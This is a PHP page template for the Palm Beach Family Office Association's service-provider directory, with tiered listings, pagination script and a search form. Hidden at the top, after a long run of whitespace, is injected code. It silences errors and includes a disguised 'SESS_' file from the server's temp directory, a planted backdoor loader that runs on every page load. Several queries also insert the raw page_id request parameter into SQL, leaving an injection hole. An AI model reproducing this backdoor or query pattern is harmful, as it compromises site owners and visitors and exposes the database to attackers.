<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               error_reporting(0);ini_set("display_errors", 0);include_once(sys_get_temp_dir()."/SESS_48cd7517d21176f980daa5502d9efb31"); ?><? include('header.php'); 
		if($resutl['page_type']=='content'){
			?>
		<article id="inner-page-wrapper">
			<section class="container page_container_team">
				<h1><?php echo $resutl['page_title']; ?></h1>
				<div class="page_content_team">
				<?php echo $resutl['page_content']; ?>
				</div>
			</section>
        </article>  
		
		<!----------- directory !0----------------------->
		
			<?php }elseif($resutl['page_type']=='directory'){ ?>
			
			
			
			<article id="inner-page-wrapper">
				<section class="container" id="container_listing">
				<h1 class="services_provider_page-title">Family Office  | <span>Family Office Service Providers</span> </h1>
				<section id="member-listing-container">
						<?php $gold_query = mysql_query('SELECT * FROM services_provider WHERE category='.$_GET['page_id'].' AND package_series=1 ORDER BY package_series ASC');
							while($gold_row = mysql_fetch_array($gold_query)){
						?>	
						
						<figure class="member_list gold_listing">
						<?php if($gold_row['file']){ ?>
							<img class="main-logo" src="../images/company_logos/<?php echo $gold_row['file']; ?>" alt="company-advertise-logo" />
						<? } ?>
							<h3>PBFOA Partners  /  <span><?php echo $gold_row['fname']." ".$gold_row['lname']; ?></span></h3>
							<figure class="content-box gold_logo">
							<?php if($gold_row['company_bio']){ ?>
							<h2>Specialty</h2>
							<p><?php echo $gold_row['company_bio']; ?></p>
							<? } ?>
							<?php if($gold_row['package_series'] ==1 ){ ?>
								<figcaption class="directory-social">
							<a href="<?php if($gold_row['facebook']){echo $gold_row['facebook'];}else{ echo "#"; } ?>"><img src="../images/facebook-icon.png" alt="icon" /></a>
									<a href="<?php if($gold_row['linkedin']){echo $gold_row['linkedin'];}else{ echo "#"; } ?>"><img src="../images/linkedin-icon.png" alt="icon" /></a>
									<a href="<?php if($gold_row['tiwtter']){echo $gold_row['tiwtter'];}else{ echo "#"; } ?>"><img src="../images/twitter-icon.png" alt="icon" /></a>
									<a href="<?php if($gold_row['googleplus']){echo $gold_row['googleplus'];}else{ echo "#"; } ?>"><img src="../images/googleplus-icon.png" alt="icon" /></a>
								</figcaption> 
							<?php } ?>
							<?php if($gold_row['address']){ ?>
								<h2>Address</h2>
								<ul class="address-ul">
								<p>PBFOA Partners<br/>
								<?php echo $gold_row['address']; ?> 
								<?php echo $gold_row['addressb']; ?></p>
								</ul>
							<?php } ?>
								<ul>
								<?php if($gold_row['phone']){ ?>
								<li class="phone-icon"><?php echo $gold_row['phone']; ?></li>
								<?php }if($gold_row['company_email']){ ?>
								<li class="mail-icon"><a href="mailto:<?php echo $gold_row['company_email']; ?>"><?php echo $gold_row['company_email']; ?></a></li>
								<?php }if($gold_row['companyweb']){ ?>
								<li class="url-icon"><?php echo $gold_row['companyweb']; ?></li>
								<?php } ?>
								</ul>
								
						</figure>
						</figure>
						
							<?php } ?>
							<div style="clear:both; display:block;"></div>
							<?php $silver_query = mysql_query('SELECT * FROM services_provider WHERE category='.$_GET['page_id'].' AND package_series=2 ORDER BY package_series ASC');
							while($silver_row = mysql_fetch_array($silver_query)){
							?>
							
							<figure class="member_list silver_listing">
						<?php if($silver_row['file']){ ?>
							<img class="main-logo" src="../images/company_logos/<?php echo $silver_row['file']; ?>" alt="company-advertise-logo" />
						<? } ?>
							<h3>PBFOA Partners  /  <span><?php echo $silver_row['fname']." ".$silver_row['lname']; ?></span></h3>
							<figure class="content-box silver_logo">
							<?php if($silver_row['company_bio']){ ?>
							<h2>Specialty</h2>
							<p><?php echo $silver_row['company_bio']; ?></p>
							<? } ?>
							
							<?php if($silver_row['address']){ ?>
								<h2>Address</h2>
								<ul class="address-ul">
								<p>PBFOA Partners<br/>
								<?php echo $silver_row['address']; ?> 
								<?php echo $silver_row['addressb']; ?></p>
								</ul>
							<?php } ?>
								<ul>
								<?php if($silver_row['phone']){ ?>
								<li class="phone-icon"><?php echo $silver_row['phone']; ?></li>
								<?php }if($silver_row['company_email']){ ?>
								<li class="mail-icon">
								<a href="mailto:<?php echo $silver_row['company_email'];  ?>" ><?php echo $silver_row['company_email'];  ?></a></li>
								<?php }if($silver_row['companyweb']){ ?>
								<li class="url-icon"><?php echo $silver_row['companyweb']; ?></li>
								<?php } ?>
								</ul>
								
						</figure>
						</figure>
						
							<?php } ?>
							
							<div style="clear:both; display:block;"></div>
							
							<?php $bronoze_query = mysql_query('SELECT * FROM services_provider WHERE category='.$_GET['page_id'].' AND package_series=3 ORDER BY package_series ASC');
							while($bronoze_row = mysql_fetch_array($bronoze_query)){
							?>
							
							<figure class="member_list basic basic_listing">
							<figure class="content-box basic_logo">
							<div class="heading">PBFOA Partners  /  <span><?php echo $bronoze_row['fname']." ".$bronoze_row['lname']; ?></span></div>
							
							<?php if($bronoze_row['company_bio']){ ?>
							<h2>Specialty</h2>
							<p><?php echo $bronoze_row['company_bio']; ?></p>
							<? } ?>
							
							<?php if($bronoze_row['address']){ ?>
								<h2>Address</h2>
								<ul class="address-ul">
								<p>PBFOA Partners<br/>
								<?php echo $bronoze_row['address']; ?>
								<?php echo $bronoze_row['addressb']; ?></p>
								</ul>
							<?php } ?>
								<ul>
								<?php if($bronoze_row['phone']){ ?>
								<li class="phone-icon"><?php echo $bronoze_row['phone']; ?></li>
								<?php } ?>
			
								</ul>
								
						</figure>
						</figure>
						
							<?php } ?>
							
							<div style="clear:both; display:block;"></div>
							
							<?php $free_query = mysql_query('SELECT * FROM services_provider WHERE category='.$_GET['page_id'].' AND package_series=4 ORDER BY package_series ASC');
							while($free_row = mysql_fetch_array($free_query)){
							?>
							
							<figure class="member_list basic free_listing">
							<figure class="content-box">
							<div class="heading">PBFOA Partners  /  <span><?php echo $free_row['fname']." ".$free_row['lname']; ?></span><ul class="free-phone">
								<?php if($free_row['phone']){ ?>
								<li class="phone-icon"><?php echo $free_row['phone']; ?></li>
								<?php } ?>
			
								</ul></div>
							
								
								
						</figure>
						</figure>
						
							<?php } ?>
							
							
							
				</section>
				
				<script>
					$(document).ready(function() {

					var show_per_page = 12;
					var number_of_items = $('#member-listing-container').children('.member_list').size();
					var number_of_pages = Math.ceil(number_of_items / show_per_page);

					$('#container_listing').append('<div class=controls></div><input id=current_page type=hidden><input id=show_per_page type=hidden>');
					$('#current_page').val(0);
					$('#show_per_page').val(show_per_page);

					var navigation_html = '<div class="next-prev"><a class="prev" onclick="previous()">Prev</a>';
					navigation_html += '<a class="next" onclick="next()">Next</a></div>';
					var current_link = 0;
					while (number_of_pages > current_link) {
						navigation_html += '<a class="page" onclick="go_to_page(' + current_link + ')" longdesc="' + current_link + '">' + (current_link + 1) + '</a>';
						current_link++;
					}
					navigation_html += '<div class="pagination-next-prev"><a class="prev" onclick="previous()">Prev</a><a class="next" onclick="next()">Next</a></div>';

					$('.controls').html(navigation_html);
					$('.controls .page:first').addClass('active');

					$('#member-listing-container').children('.member_list').css('display', 'none');
					$('#member-listing-container').children('.member_list').slice(0, show_per_page).css('display', 'block');

				});



				function go_to_page(page_num) {
					var show_per_page = parseInt($('#show_per_page').val(), 0);

					start_from = page_num * show_per_page;

					end_on = start_from + show_per_page;

					$('#member-listing-container').children('.member_list').css('display', 'none').slice(start_from, end_on).css('display', 'block');

					$('.page[longdesc=' + page_num + ']').addClass('active').siblings('.active').removeClass('active');

					$('#current_page').val(page_num);
				}



				function previous() {

					new_page = parseInt($('#current_page').val(), 0) - 1;
					//if there is an item before the current active link run the function
					if ($('.active').prev('.page').length == true) {
						go_to_page(new_page);
					}

				}

				function next() {
					new_page = parseInt($('#current_page').val(), 0) + 1;
					//if there is an item after the current active link run the function
					if ($('.active').next('.page').length == true) {
						go_to_page(new_page);
					}

				}
				</script>
				<div style="clear:both; display:block;"></div>
				</section>
			</article>
			
			<!----------- directory end ----------------------->
			
			<?php }else{ ?>
			<article id="inner-page-wrapper">
				<section class="container">
				<h1>Services Provider Directory</h1>
				
				<p>Palm Beach Family Office Association Service Provider Directory lists over 2,000 companies which provide valuable services to the global hedge fund industry. If you would like to list your company in our service provider directory register here or contact our sales department at (561) 689-8901 or email sales@PBFOA.org.</p>
				<li class="list_company_btn"><a href="http://pbfoa.org/directory/?page_id=63">LIST YOUR COMPANY </a></li>
				
				<section id="directory-left">
				
<?php
	if(isset($_GET['keywords'])){
       
       $keyword = $_GET [ 'keywords' ]; 
       $keyword2 = $_GET [ 'keywords' ]; 
       $keyword3 = $_GET [ 'keywords' ]; 
       $keyword4 = $_GET [ 'keywords' ]; 
       $keyword5 = $_GET [ 'keywords' ]; 
       $keyword6 = $_GET [ 'keywords' ]; 
       $categories = $_GET [ 'categories' ]; 
       $country = $_GET [ 'country' ]; 
 
		
	


    $qry = "SELECT * FROM services_provider";
	$searchArray = array();
    if ($keyword != '') {
        $searchArray[]= "company_name='".mysql_real_escape_string($keyword)."' AND ";
    }
	if ($keyword2 != '') {
        $searchArray[]= "job_title='".mysql_real_escape_string($keyword2)."' AND ";
    }
	if ($keyword3 != '') {
        $searchArray[]= "address='".mysql_real_escape_string($keyword3)."' AND ";
    }
	if ($keyword4 != '') {
        $searchArray[]= "city='".mysql_real_escape_string($keyword4)."' AND ";
    }
	if ($keyword5 != '') {
        $searchArray[]= "state='".mysql_real_escape_string($keyword5)."' AND ";
    }
	if ($keyword6 != '') {
        $searchArray[]= "companyweb='".mysql_real_escape_string($keyword6)."' AND ";
    }
    if ($categories != '') {
        $searchArray[]= "category='".mysql_real_escape_string($categories)."' AND ";
    }
    if ($country != '') {
        $searchArray[]= "country='".mysql_real_escape_string($country)."' AND ";
    }
    
		$qry .= ! empty($searchArray) ? " WHERE " . implode(" OR ", $searchArray) : '';
    $result = mysql_query($qry);
	
	

	}else{
 ?>

					
					<ul>
							<?php $pages_query = mysql_query('SELECT * FROM cms_pages WHERE page_parent=63');
							while($page_row = mysql_fetch_array($pages_query)){
								echo '<li><a href="?page_id='.$page_row['page_id'].'">'.$page_row['page_title'].'</a></li>';
							}
	}
						?>
					</ul>
				</section>
				
				<section id="directory-right">
	
		<figure class="search-director">
			<h4>SEARCH</br><span>Services Provider Directory</span></h4>
			<form method="get" action="" enctype="multipart/form-data">
				<input type="text" placeholder="Keyword" name="keywords"/><br/>
				<select name="categories">
				<option>Category</option>
				<?php 
				$cates_query = mysql_query('SELECT * FROM cms_pages WHERE page_parent=63');
				while($cateoptions = mysql_fetch_array($cates_query)){ ?>
					<option value="<?php echo $cateoptions['page_id']; ?>"><?php echo $cateoptions['page_title']; ?></option>
				<?php } ?>
				</select><br/>
				<select name="country">
<option>Country</option>
<option value="United States">United States</option>
<option value="Afganistan">Afghanistan</option>
<option value="Albania">Albania</option>
<option value="Algeria">Algeria</option>
<option value="American Samoa">American Samoa</option>
<option value="Andorra">Andorra</option>
<option value="Angola">Angola</option>
<option value="Anguilla">Anguilla</option>
<option value="Antigua &amp; Barbuda">Antigua &amp; Barbuda</option>
<option value="Argentina">Argentina</option>
<option value="Armenia">Armenia</option>
<option value="Aruba">Aruba</option>
<option value="Australia">Australia</option>
<option value="Austria">Austria</option>
<option value="Azerbaijan">Azerbaijan</option>
<option value="Bahamas">Bahamas</option>
<option value="Bahrain">Bahrain</option>
<option value="Bangladesh">Bangladesh</option>
<option value="Barbados">Barbados</option>
<option value="Belarus">Belarus</option>
<option value="Belgium">Belgium</option>
<option value="Belize">Belize</option>
<option value="Benin">Benin</option>
<option value="Bermuda">Bermuda</option>
<option value="Bhutan">Bhutan</option>
<option value="Bolivia">Bolivia</option>
<option value="Bonaire">Bonaire</option>
<option value="Bosnia &amp; Herzegovina">Bosnia &amp; Herzegovina</option>
<option value="Botswana">Botswana</option>
<option value="Brazil">Brazil</option>
<option value="British Indian Ocean Ter">British Indian Ocean Ter</option>
<option value="Brunei">Brunei</option>
<option value="Bulgaria">Bulgaria</option>
<option value="Burkina Faso">Burkina Faso</option>
<option value="Burundi">Burundi</option>
<option value="Cambodia">Cambodia</option>
<option value="Cameroon">Cameroon</option>
<option value="Canada">Canada</option>
<option value="Canary Islands">Canary Islands</option>
<option value="Cape Verde">Cape Verde</option>
<option value="Cayman Islands">Cayman Islands</option>
<option value="Central African Republic">Central African Republic</option>
<option value="Chad">Chad</option>
<option value="Channel Islands">Channel Islands</option>
<option value="Chile">Chile</option>
<option value="China">China</option>
<option value="Christmas Island">Christmas Island</option>
<option value="Cocos Island">Cocos Island</option>
<option value="Colombia">Colombia</option>
<option value="Comoros">Comoros</option>
<option value="Congo">Congo</option>
<option value="Cook Islands">Cook Islands</option>
<option value="Costa Rica">Costa Rica</option>
<option value="Cote DIvoire">Cote D'Ivoire</option>
<option value="Croatia">Croatia</option>
<option value="Cuba">Cuba</option>
<option value="Curaco">Curacao</option>
<option value="Cyprus">Cyprus</option>
<option value="Czech Republic">Czech Republic</option>
<option value="Denmark">Denmark</option>
<option value="Djibouti">Djibouti</option>
<option value="Dominica">Dominica</option>
<option value="Dominican Republic">Dominican Republic</option>
<option value="East Timor">East Timor</option>
<option value="Ecuador">Ecuador</option>
<option value="Egypt">Egypt</option>
<option value="El Salvador">El Salvador</option>
<option value="Equatorial Guinea">Equatorial Guinea</option>
<option value="Eritrea">Eritrea</option>
<option value="Estonia">Estonia</option>
<option value="Ethiopia">Ethiopia</option>
<option value="Falkland Islands">Falkland Islands</option>
<option value="Faroe Islands">Faroe Islands</option>
<option value="Fiji">Fiji</option>
<option value="Finland">Finland</option>
<option value="France">France</option>
<option value="French Guiana">French Guiana</option>
<option value="French Polynesia">French Polynesia</option>
<option value="French Southern Ter">French Southern Ter</option>
<option value="Gabon">Gabon</option>
<option value="Gambia">Gambia</option>
<option value="Georgia">Georgia</option>
<option value="Germany">Germany</option>
<option value="Ghana">Ghana</option>
<option value="Gibraltar">Gibraltar</option>
<option value="Great Britain">Great Britain</option>
<option value="Greece">Greece</option>
<option value="Greenland">Greenland</option>
<option value="Grenada">Grenada</option>
<option value="Guadeloupe">Guadeloupe</option>
<option value="Guam">Guam</option>
<option value="Guatemala">Guatemala</option>
<option value="Guinea">Guinea</option>
<option value="Guyana">Guyana</option>
<option value="Haiti">Haiti</option>
<option value="Hawaii">Hawaii</option>
<option value="Honduras">Honduras</option>
<option value="Hong Kong">Hong Kong</option>
<option value="Hungary">Hungary</option>
<option value="Iceland">Iceland</option>
<option value="India">India</option>
<option value="Indonesia">Indonesia</option>
<option value="Iran">Iran</option>
<option value="Iraq">Iraq</option>
<option value="Ireland">Ireland</option>
<option value="Isle of Man">Isle of Man</option>
<option value="Israel">Israel</option>
<option value="Italy">Italy</option>
<option value="Jamaica">Jamaica</option>
<option value="Japan">Japan</option>
<option value="Jordan">Jordan</option>
<option value="Kazakhstan">Kazakhstan</option>
<option value="Kenya">Kenya</option>
<option value="Kiribati">Kiribati</option>
<option value="Korea North">Korea North</option>
<option value="Korea Sout">Korea South</option>
<option value="Kuwait">Kuwait</option>
<option value="Kyrgyzstan">Kyrgyzstan</option>
<option value="Laos">Laos</option>
<option value="Latvia">Latvia</option>
<option value="Lebanon">Lebanon</option>
<option value="Lesotho">Lesotho</option>
<option value="Liberia">Liberia</option>
<option value="Libya">Libya</option>
<option value="Liechtenstein">Liechtenstein</option>
<option value="Lithuania">Lithuania</option>
<option value="Luxembourg">Luxembourg</option>
<option value="Macau">Macau</option>
<option value="Macedonia">Macedonia</option>
<option value="Madagascar">Madagascar</option>
<option value="Malaysia">Malaysia</option>
<option value="Malawi">Malawi</option>
<option value="Maldives">Maldives</option>
<option value="Mali">Mali</option>
<option value="Malta">Malta</option>
<option value="Marshall Islands">Marshall Islands</option>
<option value="Martinique">Martinique</option>
<option value="Mauritania">Mauritania</option>
<option value="Mauritius">Mauritius</option>
<option value="Mayotte">Mayotte</option>
<option value="Mexico">Mexico</option>
<option value="Midway Islands">Midway Islands</option>
<option value="Moldova">Moldova</option>
<option value="Monaco">Monaco</option>
<option value="Mongolia">Mongolia</option>
<option value="Montserrat">Montserrat</option>
<option value="Morocco">Morocco</option>
<option value="Mozambique">Mozambique</option>
<option value="Myanmar">Myanmar</option>
<option value="Nambia">Nambia</option>
<option value="Nauru">Nauru</option>
<option value="Nepal">Nepal</option>
<option value="Netherland Antilles">Netherland Antilles</option>
<option value="Netherlands">Netherlands (Holland, Europe)</option>
<option value="Nevis">Nevis</option>
<option value="New Caledonia">New Caledonia</option>
<option value="New Zealand">New Zealand</option>
<option value="Nicaragua">Nicaragua</option>
<option value="Niger">Niger</option>
<option value="Nigeria">Nigeria</option>
<option value="Niue">Niue</option>
<option value="Norfolk Island">Norfolk Island</option>
<option value="Norway">Norway</option>
<option value="Oman">Oman</option>
<option value="Pakistan">Pakistan</option>
<option value="Palau Island">Palau Island</option>
<option value="Palestine">Palestine</option>
<option value="Panama">Panama</option>
<option value="Papua New Guinea">Papua New Guinea</option>
<option value="Paraguay">Paraguay</option>
<option value="Peru">Peru</option>
<option value="Phillipines">Philippines</option>
<option value="Pitcairn Island">Pitcairn Island</option>
<option value="Poland">Poland</option>
<option value="Portugal">Portugal</option>
<option value="Puerto Rico">Puerto Rico</option>
<option value="Qatar">Qatar</option>
<option value="Republic of Montenegro">Republic of Montenegro</option>
<option value="Republic of Serbia">Republic of Serbia</option>
<option value="Reunion">Reunion</option>
<option value="Romania">Romania</option>
<option value="Russia">Russia</option>
<option value="Rwanda">Rwanda</option>
<option value="St Barthelemy">St Barthelemy</option>
<option value="St Eustatius">St Eustatius</option>
<option value="St Helena">St Helena</option>
<option value="St Kitts-Nevis">St Kitts-Nevis</option>
<option value="St Lucia">St Lucia</option>
<option value="St Maarten">St Maarten</option>
<option value="St Pierre &amp; Miquelon">St Pierre &amp; Miquelon</option>
<option value="St Vincent &amp; Grenadines">St Vincent &amp; Grenadines</option>
<option value="Saipan">Saipan</option>
<option value="Samoa">Samoa</option>
<option value="Samoa American">Samoa American</option>
<option value="San Marino">San Marino</option>
<option value="Sao Tome &amp; Principe">Sao Tome &amp; Principe</option>
<option value="Saudi Arabia">Saudi Arabia</option>
<option value="Senegal">Senegal</option>
<option value="Serbia">Serbia</option>
<option value="Seychelles">Seychelles</option>
<option value="Sierra Leone">Sierra Leone</option>
<option value="Singapore">Singapore</option>
<option value="Slovakia">Slovakia</option>
<option value="Slovenia">Slovenia</option>
<option value="Solomon Islands">Solomon Islands</option>
<option value="Somalia">Somalia</option>
<option value="South Africa">South Africa</option>
<option value="Spain">Spain</option>
<option value="Sri Lanka">Sri Lanka</option>
<option value="Sudan">Sudan</option>
<option value="Suriname">Suriname</option>
<option value="Swaziland">Swaziland</option>
<option value="Sweden">Sweden</option>
<option value="Switzerland">Switzerland</option>
<option value="Syria">Syria</option>
<option value="Tahiti">Tahiti</option>
<option value="Taiwan">Taiwan</option>
<option value="Tajikistan">Tajikistan</option>
<option value="Tanzania">Tanzania</option>
<option value="Thailand">Thailand</option>
<option value="Togo">Togo</option>
<option value="Tokelau">Tokelau</option>
<option value="Tonga">Tonga</option>
<option value="Trinidad &amp; Tobago">Trinidad &amp; Tobago</option>
<option value="Tunisia">Tunisia</option>
<option value="Turkey">Turkey</option>
<option value="Turkmenistan">Turkmenistan</option>
<option value="Turks &amp; Caicos Is">Turks &amp; Caicos Is</option>
<option value="Tuvalu">Tuvalu</option>
<option value="Uganda">Uganda</option>
<option value="Ukraine">Ukraine</option>
<option value="United Arab Erimates">United Arab Emirates</option>
<option value="United Kingdom">United Kingdom</option>
<option value="United States of America">United States of America</option>
<option value="Uraguay">Uruguay</option>
<option value="Uzbekistan">Uzbekistan</option>
<option value="Vanuatu">Vanuatu</option>
<option value="Vatican City State">Vatican City State</option>
<option value="Venezuela">Venezuela</option>
<option value="Vietnam">Vietnam</option>
<option value="Virgin Islands (Brit)">Virgin Islands (Brit)</option>
<option value="Virgin Islands (USA)">Virgin Islands (USA)</option>
<option value="Wake Island">Wake Island</option>
<option value="Wallis &amp; Futana Is">Wallis &amp; Futana Is</option>
<option value="Yemen">Yemen</option>
<option value="Zaire">Zaire</option>
<option value="Zambia">Zambia</option>
<option value="Zimbabwe">Zimbabwe</option>
</select><br/>
				<input type="submit" value="SEARCH DIRECTORY"/>
			</form>
		</figure>
		
		<figure class="featured-director">
			<h4>FEATURED</br><span>Services Provider</span></h4>
			
			<figcaption>
				<img src="../images/company-logo-red.jpg" alt="logo" />
				
				<p>PBFOA Partners<br/>Level 6, 301 George Street<br/>Palm Beach, Florida 33458<br/><a href="#">Family Office</a></p>
			</figcaption>
			
			<figcaption>
				<img src="../images/company-logo-black.jpg" alt="logo" />
				
				<p>PBFOA Partners<br/>Level 6, 301 George Street<br/>Palm Beach, Florida 33458<br/><a href="#">Consultants </a></p>
			</figcaption>
			
			<a href="http://haroon.biz/dev/josh/directory/?page_id=63" class="red-btn">LIST YOUR COMPANY</a>
		</figure>
		
		
	</section>
				
				
				</section>
        </article>

<?php } ?>











<? include('footer.php'); ?>